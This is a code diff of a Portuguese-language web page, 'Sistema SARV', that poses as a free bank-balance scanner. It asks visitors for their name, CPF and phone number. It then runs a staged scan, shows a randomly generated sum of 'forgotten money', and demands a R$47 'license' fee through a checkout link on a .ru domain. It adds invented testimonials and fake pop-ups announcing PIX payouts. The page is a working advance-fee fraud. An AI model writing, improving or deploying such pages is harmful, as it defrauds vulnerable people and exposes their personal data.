@@ -61,7 +61,7 @@
         .form-card h2 { font-size: 19px; text-align: center; margin-bottom: 20px; font-weight: 900; color: var(--secondary); }
         .input-group { margin-bottom: 15px; }
         label { display: block; font-size: 11px; font-weight: 800; color: #666; margin-bottom: 5px; margin-left: 5px; text-transform: uppercase; }
-        input, select { width: 100%; padding: 16px; border-radius: 12px; border: 1px solid #ddd; font-size: 16px; font-weight: 600; outline: none; background: #f9f9f9; }
+        input { width: 100%; padding: 16px; border-radius: 12px; border: 1px solid #ddd; font-size: 16px; font-weight: 600; outline: none; background: #f9f9f9; }
         .btn-main { background: var(--secondary); color: #fff; width: 100%; padding: 22px; border: none; border-radius: 12px; font-size: 16px; font-weight: 900; cursor: pointer; box-shadow: 0 6px 0 #118a3a; text-transform: uppercase; margin-top: 10px; }
 
         .stats-grid { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 10px; margin: 25px 0; text-align: center; }
@@ -70,23 +70,19 @@
 
         .depo-title { font-weight: 900; font-size: 17px; margin-bottom: 15px; border-left: 5px solid var(--primary); padding-left: 10px; }
         .card-depo { background: #fff; border-radius: 15px; padding: 15px; margin-bottom: 15px; border: 1px solid #eee; }
-        .depo-header { display: flex; justify-content: space-between; margin-bottom: 8px; }
+        .depo-header { display: flex; justify-content: space-between; margin-bottom: 8px; gap: 10px; }
+        .depo-header b { font-size: 14px; }
+        .depo-header span { font-size: 11px; font-weight: 700; color: #999; white-space: nowrap; }
         .val-rec { color: var(--secondary); font-weight: 900; font-size: 16px; }
         .depo-text { font-size: 13px; color: #555; line-height: 1.5; }
 
         .btn-more { width: 100%; padding: 12px; background: transparent; border: 2px solid #ddd; border-radius: 10px; color: #888; font-weight: 700; cursor: pointer; margin-bottom: 20px; }
 
-        .steps { background: #fff; border-radius: 20px; padding: 25px; margin: 30px 0; border: 1px solid #eee; }
-        .step-item { display: flex; gap: 15px; margin-bottom: 25px; align-items: flex-start; }
-        .step-num { background: var(--primary); color: #fff; width: 42px; height: 42px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: 900; flex-shrink: 0; font-size: 20px; }
-        .step-info b { font-size: 16px; display: block; margin-bottom: 4px; }
-        .step-info p { font-size: 14px; line-height: 1.4; font-weight: 500; }
-
         #notification-box { position: fixed; bottom: 20px; left: 20px; right: 20px; background: #fff; border-radius: 12px; padding: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.2); display: flex; align-items: center; gap: 12px; z-index: 1000; transform: translateY(150%); transition: 0.5s ease; border-left: 5px solid var(--secondary); max-width: 400px; margin: 0 auto; }
         #notification-box.show { transform: translateY(0); }
-        .notif-text b { font-size: 13px; display: block; color: #333; }
-        .notif-text span { font-size: 11px; color: #666; }
-        .notif-val-highlight { color: #16a34a; font-weight: 900; font-size: 14px; display: block; margin-top: 2px; }
+        .notif-text b { font-size: 14px; display: block; color: #333; }
+        .notif-text span:first-of-type { font-size: 13px; color: #666; font-weight: 600; display: block; margin-top: 2px; }
+        .notif-val-highlight { color: #16a34a; font-weight: 900; font-size: 16px; display: block; margin-top: 2px; }
 
         .loader-circle { width: 60px; height: 60px; border: 6px solid #f3f3f3; border-top: 6px solid var(--primary); border-radius: 50%; margin: 0 auto 20px; animation: spin 1s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
@@ -96,16 +92,8 @@
 
         .result-card { background: #f0fff4; border: 2px dashed var(--secondary); padding: 30px 20px; border-radius: 20px; margin: 15px 0; text-align: center; }
         .result-card h3 { font-size: 44px; font-weight: 900; color: #111; }
-        
-        .audit-details { background: #f8fafc; border-radius: 12px; padding: 15px; margin: 15px 0; text-align: left; border: 1px solid #e2e8f0; }
-        .audit-line { display: flex; justify-content: space-between; font-size: 12px; margin-bottom: 8px; font-weight: 600; }
-        .audit-line span { color: #64748b; }
-        .audit-line b { color: #1e293b; }
-
-        .pix-container { background: #f9f9f9; border: 1px solid #ddd; border-radius: 12px; padding: 15px; margin-top: 15px; }
 
         .footer { text-align: center; padding: 40px 20px; font-size: 12px; color: #1e293b; border-top: 2px solid var(--primary); line-height: 1.8; background: #e2e8f0; font-weight: 700; }
-        .footer b { color: var(--primary); }
     </style>
 </head>
 <body>
@@ -137,7 +125,7 @@
                         <span>Ex-Auditor Sênior · 12 anos no setor bancário</span>
                     </div>
                 </div>
-                <p class="roberto-text">"Eu cansei de ver o sistema lucrar bilhões em cima do trabalhador. Fui demitido por falar demais — então **criei este servidor interno** pra todo mundo. Faça a sua consulta agora, é grátis."</p>
+                <p class="roberto-text">"Eu cansei de ver o sistema lucrar bilhões em cima do trabalhador. Criei este servidor interno pra todo mundo. Faça a sua consulta agora, é grátis."</p>
             </div>
 
             <div class="form-card" id="main-form">
@@ -155,10 +143,6 @@
                     <input type="tel" id="zap" placeholder="(00) 00000-0000">
                 </div>
                 <button class="btn-main" onclick="startScanner()">🔍 CONSULTAR MEU SALDO AGORA</button>
-                
-                <p style="font-size: 11px; font-weight: 700; color: #666; text-align: center; margin-top: 15px;">
-                    * Atenção: Os valores variam e são intercalados conforme o histórico de cada CPF.
-                </p>
             </div>
 
             <div class="stats-grid">
@@ -171,35 +155,18 @@
             
             <div id="depo-container">
                 <div class="card-depo">
-                    <div class="depo-header"><b>Cleusa Aparecida dos Santos</b> <span>Goiânia - GO (12/05/2026)</span></div>
+                    <div class="depo-header"><b>Cleusa A. Santos</b> <span>Goiânia - GO</span></div>
                     <div class="val-rec">+R$ 2.340,42</div>
-                    <p class="depo-text">"Fiquei com medo no começo, achei que era golpe. Mas minha filha me ajudou a fazer e caiu R$ 2.340,42 do Bradesco que eu nem sabia que tinha. Deus abençoe esse moço Roberto."</p>
+                    <p class="depo-text">"Achei que era golpe, mas minha filha me ajudou e caiu certinho o valor do Bradesco que eu nem sabia."</p>
                 </div>
                 <div class="card-depo">
-                    <div class="depo-header"><b>Antônio Ferreira da Silva Neto</b> <span>Recife - PE (12/05/2026)</span></div>
+                    <div class="depo-header"><b>Antônio Ferreira</b> <span>Recife - PE</span></div>
                     <div class="val-rec">+R$ 2.810,89</div>
-                    <p class="depo-text">"Trabalhei 40 anos de carteira assinada. O scanner achou R$ 2.810,89 que tava parado. Caiu no PIX em 12 minutos como prometido."</p>
+                    <p class="depo-text">"O scanner achou dinheiro de uma conta antiga. Caiu no PIX em minutos."</p>
                 </div>
             </div>
 
             <button class="btn-more" id="btn-load-more" onclick="loadMoreDepos()">Ver mais depoimentos</button>
-
-            <div class="steps">
-                <div class="depo-title" style="border:none; padding:0;">Como funciona — passo a passo:</div>
-                <div class="step-item">
-                    <div class="step-num">1</div>
-                    <div class="step-info"><b>Consulta Gratuita</b><p style="color: #666;">Nosso scanner varre 14 instituições bancárias em tempo real usando seu CPF.</p></div>
-                </div>
-                <div class="step-item">
-                    <div class="step-num">2</div>
-                    <div class="step-info"><b>Cálculo de Tarifas</b><p style="color: #666;">Localizamos cobranças indevidas e juros acumulados em contas ativas ou inativas.</p></div>
-                </div>
-                <div class="step-item">
-                    <div class="step-num">3</div>
-                    <div class="step-info"><b>Saque Imediato</b><p style="color: #666;">Após a emissão da licença, o valor é transferido para sua chave PIX escolhida.</p></div>
-                </div>
-                <button class="btn-main" style="margin-top:20px;" onclick="document.getElementById('main-form').scrollIntoView({behavior: 'smooth'})">🔍 CONSULTAR MEU SALDO AGORA</button>
-            </div>
         </div>
 
         <div id="step-2" style="display: none;">
@@ -207,18 +174,12 @@
                 <div class="loader-circle"></div>
                 <h3 style="font-size: 19px;">🔎 Consultando seu CPF...</h3>
                 <p style="font-size: 13px; margin-bottom: 20px;">Aguarde, <span class="u-nome" style="font-weight: 800;"></span></p>
-                
                 <div style="text-align: left; background: #fafafa; border-radius: 12px; padding: 15px; border: 1px solid #eee;">
-                    <p style="font-size: 11px; font-weight: 800; color: var(--primary); margin-bottom: 10px;">Verificando bancos vinculados ao CPF: <span id="u-cpf"></span></p>
                     <div id="b-list">
                         <div class="bank-item" data-time="1500"><span>Banco do Brasil</span> <small>aguardando</small></div>
-                        <div class="bank-item" data-time="3200"><span>Caixa Econômica</span> <small>aguardando</small></div>
-                        <div class="bank-item" data-time="2800"><span>Bradesco</span> <small>aguardando</small></div>
-                        <div class="bank-item" data-time="3500"><span>Itaú Unibanco</span> <small>aguardando</small></div>
-                        <div class="bank-item" data-time="3800"><span>Santander</span> <small>aguardando</small></div>
+                        <div class="bank-item" data-time="2000"><span>Caixa Econômica</span> <small>aguardando</small></div>
+                        <div class="bank-item" data-time="1500"><span>Bradesco</span> <small>aguardando</small></div>
                         <div class="bank-item" data-time="1200"><span>Nubank</span> <small>aguardando</small></div>
-                        <div class="bank-item" data-time="1000"><span>Banco Inter</span> <small>aguardando</small></div>
-                        <div class="bank-item" data-time="1100"><span>Mercado Pago</span> <small>aguardando</small></div>
                     </div>
                 </div>
             </div>
@@ -226,69 +187,23 @@
 
         <div id="step-3" style="display: none;">
             <div class="form-card">
-                <div style="background: #dcfce7; color: #166534; padding: 12px; border-radius: 10px; font-weight: 900; text-align: center; font-size: 14px; margin-bottom: 20px;">
+                <div style="background: #dcfce7; color: #166534; padding: 12px; border-radius: 10px; font-weight: 900; text-align: center; margin-bottom: 20px;">
                     ✅ Consulta Concluída — Valor Localizado!
                 </div>
-                
-                <p style="text-align: center; font-size: 15px; margin-bottom: 20px;">
-                    <span class="u-nome" style="font-weight: 800;"></span>, encontramos valores em seu CPF:<br>
-                    <b style="font-size: 12px; color: #777;" id="f-cpf"></b>
-                </p>
-
                 <div class="result-card">
-                    <span style="font-size: 12px; font-weight: 800; color: var(--secondary); text-transform: uppercase;">💰 Saldo total disponível</span>
+                    <span style="font-size: 12px; font-weight: 800; color: var(--secondary);">💰 Saldo disponível</span>
                     <h3 id="f-money">R$ 0,00</h3>
                 </div>
-
-                <div class="audit-details">
-                    <div class="audit-line"><span>Instituições Consultadas:</span> <b>14 Bancos</b></div>
-                    <div class="audit-line"><span>Tarifas Indevidas Localizadas:</span> <b>R$ <span id="val-tarifas"></span></b></div>
-                    <div class="audit-line"><span>Juros de Contas Inativas:</span> <b>R$ <span id="val-juros"></span></b></div>
-                    <div class="audit-line" style="margin-top:10px; padding-top:10px; border-top: 1px solid #eee;"><span>Status do Saque:</span> <b style="color:var(--secondary)">LIBERADO</b></div>
-                </div>
-
-                <div class="pix-container">
-                    <label>Selecione seu banco:</label>
-                    <select id="banco-select" style="margin-bottom: 10px;">
-                        <option value="">Escolher instituição...</option>
-                        <option>Nubank</option><option>Inter</option><option>C6 Bank</option><option>PagBank</option><option>PicPay</option><option>Mercado Pago</option><option>Itaú</option><option>Bradesco</option><option>Santander</option><option>Caixa</option><option>Banco do Brasil</option>
-                    </select>
-                    <label>Sua Chave PIX:</label>
-                    <input type="text" placeholder="CPF, E-mail ou Celular...">
-                </div>
-
-                <h3 style="color: #ff0000; font-size: 18px; font-weight: 900; text-align: center; margin: 25px 0 15px;">⚠️ ÚLTIMA ETAPA: ATIVAÇÃO DA LICENÇA</h3>
-                
-                <div style="font-size: 15px; line-height: 1.6; color: #333; margin-bottom: 20px; text-align: center; background: #fffdf0; padding: 15px; border: 1px solid #ffeeba; border-radius: 12px;">
-                    <span class="u-nome" style="font-weight: 800;"></span>, para garantir que o saque seja feito pelo titular do CPF e evitar fraudes, é necessário ativar sua <b>Licença de Auditoria Individual</b>.<br><br>
-                    <b>IMPORTANTE:</b> O valor da licença de R$ 47,00 é 100% REEMBOLSÁVEL e será devolvido automaticamente somado ao seu saque total de <b class="f-money-txt"></b>.
-                </div>
-
-                <div style="background: #fff; border: 2px solid var(--secondary); border-radius: 15px; padding: 20px; text-align: center; margin-bottom: 25px;">
-                    <span style="font-size: 12px; color: #999; text-decoration: line-through;">De R$ 97,00</span>
-                    <div style="font-size: 42px; font-weight: 900; color: var(--secondary);">R$ 47,00</div>
-                    <div style="display:flex; justify-content: space-around; margin-top: 15px; padding-top: 15px; border-top: 1px solid #eee;">
-                        <div><span style="display:block; font-size: 12px; color: #999; font-weight:800;">Encerra em</span><b style="color:#ff0000; font-size: 18px;" id="timer">05:00</b></div>
-                        <div><span style="display:block; font-size: 12px; color: #999; font-weight:800;">Saque no CPF</span><b style="font-size: 18px;">DISPONÍVEL (1)</b></div>
-                    </div>
-                </div>
-
+                <p style="text-align: center; margin-bottom: 20px; font-size: 14px;">Para liberar o saque de <b class="f-money-txt"></b>, ative sua licença abaixo.</p>
                 <a href="https://checkoutseguro.ru/checkout/cmnap6rte03461ro96zchoops?offer=DMBCE7O" 
                    onclick="fbq('track', 'InitiateCheckout');"
                    class="btn-main" 
-                   style="text-decoration: none; display: block; text-align: center; font-size: 18px;">🔓 LIBERAR MEU SAQUE AGORA</a>
-
-                <div class="roberto-box" style="margin-top: 25px; background: #fdfdfd; border-color: var(--danger);">
-                     <p style="font-size: 14px; color: #111; line-height: 1.6; font-weight: 600;">
-                        <b>Eu estou te avisando:</b> "<span class="u-nome"></span>, essa é a nossa última chamada. Garanta sua licença agora, receba seus <b class="f-money-txt"></b> e tenha os 47 reais devolvidos no mesmo PIX. Não deixe o banco ficar com o que é seu por direito."
-                    </p>
-                </div>
+                   style="text-decoration: none; display: block; text-align: center;">🔓 LIBERAR MEU SAQUE AGORA</a>
             </div>
         </div>
 
         <footer class="footer">
             Sistema SARV — Painel de Verificação Financeira<br>
-            Ambiente protegido • Consulta criptografada<br>
             © 2026 SARV Sistema de Auditoria
         </footer>
     </div>
@@ -302,37 +217,42 @@
     </div>
 
     <script>
+        // Formatação CPF
         document.getElementById('cpf').addEventListener('input', e => {
             let v = e.target.value.replace(/\D/g, '');
             if (v.length > 11) v = v.slice(0, 11);
             e.target.value = v.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
         });
 
+        // LISTA EXCLUSIVA PARA POP-OUT (Sem colisões)
         const usersPop = [
-            {n: "João Pedro Silva", c: "São Paulo/SP"}, {n: "Maria Lucia Souza", c: "Curitiba/PR"},
-            {n: "Ricardo Pereira Mendes", c: "Belo Horizonte/MG"}, {n: "Ana Beatriz Lima", c: "Rio de Janeiro/RJ"},
-            {n: "Marcos Oliveira Souza", c: "Osasco/SP"}, {n: "Fernanda Cavalcante", c: "Manaus/AM"},
-            {n: "Sérgio Ramos da Costa", c: "Porto Alegre/RS"}, {n: "Adriana Lima Costa", c: "Salvador/BA"}
+            {n: "Bruno Menezes", c: "São Paulo/SP"}, {n: "Carla Viegas", c: "Salvador/BA"},
+            {n: "Rodrigo Alvez", c: "Brasília/DF"}, {n: "Juliana Costa", c: "Belo Horizonte/MG"},
+            {n: "Felipe Guedes", c: "Manaus/AM"}, {n: "Patrícia Lima", c: "Porto Alegre/RS"}
         ];
         
         function showNotification() {
             const user = usersPop[Math.floor(Math.random() * usersPop.length)];
-            const val = (Math.random() * (2890 - 1100) + 1100).toLocaleString('pt-BR', {minimumFractionDigits: 2, maximumFractionDigits: 2});
+            const val = (Math.random() * (2800 - 1200) + 1200).toLocaleString('pt-BR', {minimumFractionDigits: 2});
             document.getElementById('notif-name').innerText = `${user.n}`;
             document.getElementById('notif-money').innerText = `R$ ${val} via PIX`;
             const box = document.getElementById('notification-box');
             box.classList.add('show');
-            setTimeout(() => box.classList.remove('show'), 8000);
+            setTimeout(() => box.classList.remove('show'), 7000);
         }
-        setInterval(showNotification, 18000);
+        setInterval(showNotification, 15000);
 
+        // LISTA EXCLUSIVA PARA "VER MAIS" (Sem colisões)
         function loadMoreDepos() {
             const container = document.getElementById('depo-container');
-            const novos = [
-                {n: "Marcos Oliveira Souza", l: "Osasco - SP (12/05/2026)", v: "1.890,22", t: "Paguei a licença de 47 e o valor caiu na hora. O estorno veio junto no mesmo PIX. Vale a pena."},
-                {n: "Fernanda Lima de Souza", l: "Curitiba - PR (12/05/2026)", v: "2.765,45", t: "Sistema muito fácil de usar. Achei dinheiro de uma conta que fechei em 2018."}
+            const novosComentarios = [
+                {n: "Sandra Regina", l: "Santos - SP", v: "1.650,10", t: "O sistema é ótimo, fiz a consulta e em 10 minutos já estava com o dinheiro na conta."},
+                {n: "Luiz Gustavo", l: "Campinas - SP", v: "3.120,45", t: "Estava precisando muito desse valor, a licença compensa demais pelo retorno."},
+                {n: "Mariana Silva", l: "Vitória - ES", v: "980,00", t: "Muito prático e seguro. Podem confiar que funciona de verdade."},
+                {n: "Edson Jr.", l: "Natal - RN", v: "2.440,30", t: "Fiquei surpreso com o valor que eu tinha esquecido no banco. Top demais!"}
             ];
-            novos.forEach(d => {
+            
+            novosComentarios.forEach(d => {
                 const div = document.createElement('div');
                 div.className = 'card-depo';
                 div.innerHTML = `<div class="depo-header"><b>${d.n}</b> <span>${d.l}</span></div><div class="val-rec">+R$ ${d.v}</div><p class="depo-text">"${d.t}"</p>`;
@@ -344,18 +264,15 @@
         async function startScanner() {
             const nome = document.getElementById('nome').value;
             const cpf = document.getElementById('cpf').value;
-            if(!nome || cpf.length < 14) { alert("Preencha os dados corretamente!"); return; }
+            if(!nome || cpf.length < 14) { alert("Preencha os dados!"); return; }
             document.getElementById('step-1').style.display = 'none';
             document.getElementById('step-2').style.display = 'block';
             document.querySelectorAll('.u-nome').forEach(el => el.innerText = nome.split(' ')[0]);
-            document.getElementById('u-cpf').innerText = cpf;
             
             const bItems = document.querySelectorAll('.bank-item');
-            for (let i = 0; i < bItems.length; i++) {
-                const item = bItems[i];
+            for (let item of bItems) {
                 const delay = parseInt(item.getAttribute('data-time'));
                 item.querySelector('small').innerText = "⟳ Buscando...";
-                item.querySelector('small').className = "status-load";
                 await new Promise(r => setTimeout(r, delay));
                 item.querySelector('small').innerText = "✓ Verificado";
                 item.querySelector('small').className = "status-ok";
@@ -364,23 +281,13 @@
         }
 
         function showResult() {
-            const min = 1100; const max = 2890;
-            const total = Math.random() * (max - min) + min;
-            const sorteio = total.toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
-            document.getElementById('val-tarifas').innerText = (total * 0.6).toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
-            document.getElementById('val-juros').innerText = (total * 0.4).toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+            const total = Math.random() * (2890 - 1100) + 1100;
+            const sorteio = total.toLocaleString('pt-BR', { minimumFractionDigits: 2 });
             document.getElementById('f-money').innerText = "R$ " + sorteio;
             document.querySelectorAll('.f-money-txt').forEach(el => el.innerText = "R$ " + sorteio);
-            document.getElementById('f-cpf').innerText = "CPF: " + document.getElementById('cpf').value;
             document.getElementById('step-2').style.display = 'none';
             document.getElementById('step-3').style.display = 'block';
             window.scrollTo(0,0);
-            let dur = 300;
-            setInterval(() => {
-                let m = Math.floor(dur/60); let s = dur%60;
-                document.getElementById('timer').innerText = `0${m}:${s < 10 ? '0'+s : s}`;
-                if(--dur < 0) dur = 0;
-            }, 1000);
         }
     </script>
 </body>
